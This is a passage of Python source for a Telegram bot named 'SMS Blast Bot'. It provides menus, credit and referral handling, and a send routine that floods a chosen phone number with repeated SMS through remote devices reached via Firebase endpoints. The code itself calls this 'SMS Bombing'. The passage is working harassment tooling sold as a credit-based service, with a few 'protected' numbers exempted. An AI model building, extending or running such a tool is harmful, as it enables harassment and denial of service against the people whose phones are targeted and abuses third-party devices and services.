        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤"), btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"), btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥"), btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤")],
        [btn("ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹"), btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁"), btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥")],
        [btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊"), btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸")],
        [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, _ in enumerate(d.get("videos", []), 1):
        rows.append([btn(f"Video #{idx}", "noop", EMOJI_VIDEO, "📹"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict) -> InlineKeyboardMarkup:
    rows = [[
        btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
        btn("ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
    ]]
    for fb in d.get("firebases", []):
        rows.append([btn(fb.get("label", fb["url"][:28])[:28], "noop", EMOJI_FIRE, "🔥"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"),
                         btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in d.get("admins", []):
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    rows = [[btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")] for bid in d.get("banned", [])]
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {}); items = list(users.items())
    per = 10; start = page * per; chunk = items[start:start + per]
    approved = d.get("approved", []); banned = d.get("banned", [])
    lines = [f"{em(EMOJI_STAR,'👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str); name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0); credits = udata.get("credits", 0)
        if uid in banned: st = em(EMOJI_CROSS, "🚫")
        elif uid in approved: st = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): st = em(EMOJI_CROWN, "👑")
        elif uid in d.get("admins", []): st = em(EMOJI_SHIELD, "🛡")
        else: st = em(EMOJI_STAR, "👤")
        lines.append(f"{st} <code>{uid}</code> — {name[:18]} | 💰{credits} | 📤{uses}")
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {}); api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR,'📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK,'📤')} sᴇɴᴛ: <b>{stats.get('total_sent',0)}</b>",
        f"{em(EMOJI_CROSS,'❌')} ғᴀɪʟᴇᴅ: <b>{stats.get('total_failed',0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━", f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING,'😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fs in api_use.items():
        fb = fbs.get(fb_id); label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<","&lt;").replace(">","&gt;").replace("&","&amp;")
        lines.append(f"{em(EMOJI_FIRE,'🔥')} {label}\n   ✅ {fs.get('sent',0)}  ❌ {fs.get('failed',0)}")
    return "\n".join(lines)
R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    uname = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        asyncio.create_task(send_channel_log(msg.bot,
            f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {uname}\n📅 {fmt_time(int(time.time()))}"))
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF") and not d["users"].get(str(uid), {}).get("referred_by"):
        ok, _, ref = process_referral(uid, code, d)
        if ok and ref:
            try:
                await msg.bot.send_message(ref,
                    f"{em(EMOJI_GIFT,'🎉')} Referral used by <b>{name}</b>. +{d['settings']['ref_credits']} credits!",
                    parse_mode="HTML")
            except: pass
        save(d)
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                         parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id,
        caption=f"{em(EMOJI_ROCKET,'🚀')} Welcome to SMS Blast Bot!\nDev: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS,'🚫')} You are banned.", parse_mode="HTML"); return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS,'⛔')} Access denied. Contact dev {SUPER_ADMIN_NAME}.", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    uname = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d); save(d)
    if is_new:
        asyncio.create_task(send_channel_log(msg.bot,
            f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {uname}\n📅 {fmt_time(int(time.time()))}"))
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                         parse_mode="HTML", disable_web_page_preview=True)
        return
    await send_random_video(msg.bot, msg.chat.id,
        caption=f"{em(EMOJI_ROCKET,'🚀')} Welcome to SMS Blast Bot!\nDev: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS,'🚫')} You are banned.", parse_mode="HTML"); return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS,'⛔')} Access denied. Contact dev {SUPER_ADMIN_NAME}.", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id; d = load()
    ok, missing = await user_joined_all(cq.bot, uid, d)
    if not ok:
        await cq.answer("❌ Not joined yet!", show_alert=True)
        try:
            await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                       parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id,
        caption=f"{em(EMOJI_ROCKET,'🚀')} Verified!\nDev: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d):
        await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else:
        await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ===== USER SEND FLOW =====
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    ok, missing = await user_joined_all(cq.bot, uid, d)
    if not ok:
        await cq.answer("⛔ Join required!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                   parse_mode="HTML", disable_web_page_preview=True); return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE,'📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Target number:\n<i>Example: +919876543210</i>",
        reply_markup=kb((sc("cancel"), "user:home")), parse_mode="HTML")

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+","").replace(" ","").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Invalid. Try again:", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK,'🔒')} Protected number!", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK,'✅')} <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR,'💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=kb((sc("cancel"), "user:cancel")), parse_mode="HTML")

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(f"{em(EMOJI_ROCKET,'⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
                     reply_markup=speed_kb("user"), parse_mode="HTML")

@R.callback_query(F.data.in_({"user:speed:fast","user:speed:medium","user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    sp = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}[cq.data]
    label = "🚀 FAST" if sp == SPEED_FAST else "⚡ MEDIUM" if sp == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sp)
    await state.set_state(S.send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    count = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        credit_info = f"\n{em(EMOJI_MONEY,'💰')} Credits: <b>{get_user_credits(uid, d)}</b>\n"
    await cq.message.edit_text(
        f"{label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR,'📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE,'🔥')} Online APIs: <b>{count}</b>\n"
        f"{em(EMOJI_CHECK,'📤')} Capacity: <b>{count*3}</b> SMS{credit_info}\n\n"
        f"How many SMS to send?",
        reply_markup=kb((sc("cancel"), "user:cancel")), parse_mode="HTML")

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    data = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Send a number (e.g. 5):", parse_mode="HTML"); return
    await state.clear()
    number = data.get("number", ""); message = data.get("message", "")
    speed = data.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d) and not is_owner(uid, d):
        cur = get_user_credits(uid, d)
        if cur <= 0:
            await msg.answer(f"{em(EMOJI_CROSS,'❌')} No credits! Contact {SUPER_ADMIN_NAME}.",
                             reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML"); return
        if count > cur:
            await msg.answer(f"{em(EMOJI_WARNING,'⚠️')} Only {cur} credits. Sending {cur}...", parse_mode="HTML")
            count = cur
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING,'😴')} No API online.",
                         reply_markup=kb((sc("home"), "user:home")), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message, count, devices, speed)

# ===== OWNER SEND =====
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN,'👑')} <b>Owner SMS</b>\n\n{em(EMOJI_PHONE,'📞')} {sc('number')}:",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    n = msg.text.strip()
    if not n.replace("+","").replace(" ","").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Invalid:", parse_mode="HTML"); return
    await state.update_data(number=n); await state.set_state(S.owner_send_message)
    await msg.answer(f"{em(EMOJI_CHECK,'✅')} <code>{n}</code>\n{em(EMOJI_STAR,'💬')} {sc('message')}:",
                     reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip()); await state.set_state(S.owner_send_speed)
    await msg.answer(f"{em(EMOJI_ROCKET,'⚡')} {sc('speed')}:", reply_markup=speed_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:speed:fast","owner:speed:medium","owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    sp = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}[cq.data]
    label = "🚀 FAST" if sp == SPEED_FAST else "⚡ MEDIUM" if sp == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sp); await state.set_state(S.owner_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    c = len(devices)
    await cq.message.edit_text(
        f"{label}\n\n{em(EMOJI_STAR,'📊')} {sc('count')}\n"
        f"{em(EMOJI_FIRE,'🔥')} APIs: <b>{c}</b>\n{em(EMOJI_CHECK,'📤')} Cap: <b>{c*3}</b>\n\nHow many SMS?",
        reply_markup=kb((sc("cancel"), "owner:home")), parse_mode="HTML")

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    data = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Send a number:", parse_mode="HTML"); return
    await state.clear()
    number = data.get("number",""); message = data.get("message",""); speed = data.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING,'😴')} No API online.",
                         reply_markup=kb((sc("owner panel"), "owner:home")), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message, count, devices, speed)

# ===== ADMIN SEND =====
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD,'🛡')} <b>Admin SMS</b>\n\n{em(EMOJI_PHONE,'📞')} {sc('number')}:",
        reply_markup=kb((sc("cancel"), "admin:home")), parse_mode="HTML")

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    n = msg.text.strip()
    if not n.replace("+","").replace(" ","").isdigit() or len(n) < 7:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Invalid:", parse_mode="HTML"); return
    if n in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK,'🔒')} Protected number!", parse_mode="HTML"); return
    await state.update_data(number=n); await state.set_state(S.admin_send_message)
    await msg.answer(f"{em(EMOJI_CHECK,'✅')} <code>{mask_number(n)}</code>\n{em(EMOJI_STAR,'💬')} {sc('message')}:",
                     reply_markup=kb((sc("cancel"), "admin:home")), parse_mode="HTML")

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip()); await state.set_state(S.admin_send_speed)
    await msg.answer(f"{em(EMOJI_ROCKET,'⚡')} {sc('speed')}:", reply_markup=speed_kb("admin"), parse_mode="HTML")

@R.callback_query(F.data.in_({"admin:speed:fast","admin:speed:medium","admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    sp = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}[cq.data]
    label = "🚀 FAST" if sp == SPEED_FAST else "⚡ MEDIUM" if sp == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sp); await state.set_state(S.admin_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    c = len(devices)
    await cq.message.edit_text(
        f"{label}\n\n{em(EMOJI_STAR,'📊')} {sc('count')}\n"
        f"{em(EMOJI_FIRE,'🔥')} APIs: <b>{c}</b>\n{em(EMOJI_CHECK,'📤')} Cap: <b>{c*3}</b>\n\nHow many SMS?",
        reply_markup=kb((sc("cancel"), "admin:home")), parse_mode="HTML")

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    data = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS,'❌')} Send a number:", parse_mode="HTML"); return
    await state.clear()
    number = data.get("number",""); message = data.get("message",""); speed = data.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING,'😴')} No API online.",
                         reply_markup=kb((sc("admin panel"), "admin:home")), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message, count, devices, speed)

# ===== SMS BLAST RUNNER =====
async def run_sms_blast_with_progress(bot, msg, uid, number, message, count, devices, speed=SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing on {mask_number(number)}</b>")
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(f"{em(EMOJI_WARNING,'⚠️')} Sending already running!", parse_mode="HTML"); return
            del USER_SESSIONS[uid]
        session = UserSession(uid); session.number = number
        USER_SESSIONS[uid] = session
    d0 = load()
    is_user = not is_admin(uid, d0) and not is_owner(uid, d0)
    cur_credits = get_user_credits(uid, d0) if is_user else None
    speed_label = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"
    try:
        prog = await msg.answer(progress_text(0, 0, count, cur_credits, speed_label),
                                reply_markup=stop_send_kb(), parse_mode="HTML")
    except Exception as e:
        log.error(f"Progress msg fail: {e}")
        async with SESSIONS_LOCK: USER_SESSIONS.pop(uid, None)
        return
    sent_ok = sent_fail = 0; left = count
    usage_delta = {}; last_up = time.time(); start = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, left, last_up
        try:
            for dev in devices:
                if left <= 0: break
                async with session.lock:
                    if session.cancelled: break
                fb_id, fb_url, dev_id = dev["fb_id"], dev["fb_url"], dev["dev_id"]
                sims = dev.get("sims") or [{"simSlotIndex": 0}]
                slots = [s.get("simSlotIndex", 0) for s in sims]
                quota = min(3, left); d_sent = 0
                for sim in slots:
                    async with session.lock:
                        if d_sent >= quota or left <= 0 or session.cancelled: break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
                        if ok:
                            sent_ok += 1; d_sent += 1; left -= 1
                            if is_user:
                                dd = load(); deduct_credits(uid, 1, dd)
                                dd["stats"]["total_sent"] = dd["stats"].get("total_sent",0) + 1
                                k = str(uid)
                                if k in dd["users"]: dd["users"][k]["uses"] = dd["users"][k].get("uses",0) + 1
                                dd.setdefault("sms_history",{}).setdefault(k,[]).append(
                                    {"number": number, "message": message[:100],
                                     "timestamp": int(time.time()), "status": "sent"})
                                save(dd)
                        else:
                            sent_fail += 1; left -= 1
                        usage_delta.setdefault(fb_id, {"sent": 0, "failed": 0})
                        usage_delta[fb_id]["sent" if ok else "failed"] += 1
                        now = time.time()
                        if (now - last_up >= _PROGRESS_UPDATE_INTERVAL or
                            (sent_ok + sent_fail) == count or session.cancelled):
                            live_cr = get_user_credits(uid, load()) if is_user else None
                            try:
                                await prog.edit_text(
                                    progress_text(sent_ok, sent_fail, count, live_cr, speed_label),
                                    reply_markup=stop_send_kb() if not session.cancelled else None,
                                    parse_mode="HTML")
                            except TelegramBadRequest: pass
                            last_up = now
                    await asyncio.sleep(speed)
        except Exception as e:
            log.error(f"Send loop err {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok; session.failed = sent_fail

    task = asyncio.create_task(do_send()); session.task = task; await task
    was_cancelled = session.cancelled
    async with SESSIONS_LOCK: USER_SESSIONS.pop(uid, None)

    if not is_user:
        df = load()
        df["stats"]["total_sent"] = df["stats"].get("total_sent",0) + sent_ok
        df["stats"]["total_failed"] = df["stats"].get("total_failed",0) + sent_fail
        for fid, dl in usage_delta.items():
            df["stats"].setdefault("api_usage",{}).setdefault(fid, {"sent": 0, "failed": 0})
            df["stats"]["api_usage"][fid]["sent"] += dl["sent"]
            df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
        k = str(uid)
        if k in df["users"]: df["users"][k]["uses"] = df["users"][k].get("uses",0) + sent_ok
        df.setdefault("sms_history",{}).setdefault(k,[]).append(
            {"number": number, "message": message[:100], "timestamp": int(time.time()),
             "status": "completed" if not was_cancelled else "stopped"})
        save(df)
    else:
        df = load()
        df["stats"]["total_failed"] = df["stats"].get("total_failed",0) + sent_fail
        for fid, dl in usage_delta.items():
            df["stats"].setdefault("api_usage",{}).setdefault(fid, {"sent": 0, "failed": 0})
            df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
        save(df)

    dl = load()
    dur = int(time.time() - start)
    log_activity(dl, "sms_blast", uid,
        f"ok:{sent_ok} fail:{sent_fail} total:{count} dur:{dur}s stop:{was_cancelled}")
    save(dl)
    try:
        ci = await bot.get_chat(uid)
        un = ci.full_name or "Unknown"
        uu = f"@{ci.username}" if ci.username else "No Username"
    except: un, uu = "Unknown", "No Username"
    asyncio.create_task(send_channel_log(bot,
        f"🚀 <b>SMS BLAST</b>\n👤 {un}\n🆔 <code>{uid}</code>\n🌐 {uu}\n"
        f"📞 <code>{number}</code>\n💬 <code>{message}</code>\n"
        f"✅ {sent_ok}  ❌ {sent_fail}  📊 {count}\n⏱ {fmt_duration(dur)}\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}"))
    icon = em(EMOJI_CHECK,"✅") if sent_fail == 0 and sent_ok > 0 else em(EMOJI_WARNING,"⚠️") if sent_ok > 0 else em(EMOJI_CROSS,"❌")
    credit_text = ""
    if is_user:
        credit_text = f"\n💰 Used: <b>{sent_ok}</b>\n💳 Left: <b>{get_user_credits(uid, load())}</b>"
    stopped = f"\n{em(EMOJI_CROSS,'🛑')} <b>Stopped by user</b>" if was_cancelled else ""
    if is_owner(uid, load()): back = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙")]
    elif is_admin(uid, load()): back = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙")]
    else: back = [btn("sᴇɴᴅ ᴀɢᴀɪɴ", "user:send", EMOJI_ROCKET, "📤"), btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠")]
    try:
        await prog.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped}\n\n"
            f"{em(EMOJI_PHONE,'📞')} <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR,'💬')} <code>{message[:50]}{'...' if len(message)>50 else ''}</code>\n"
            f"{em(EMOJI_CHECK,'✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS,'❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE,'🔥')} APIs: <b>{len(usage_delta)}</b>\n"
            f"{em(EMOJI_GEAR,'⏱')} {fmt_duration(int(time.time()-start))}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]), parse_mode="HTML")
    except Exception as e:
        log.error(f"Final edit fail: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            await cq.answer("✅ Already complete!", show_alert=True); return
        s.cancelled = True
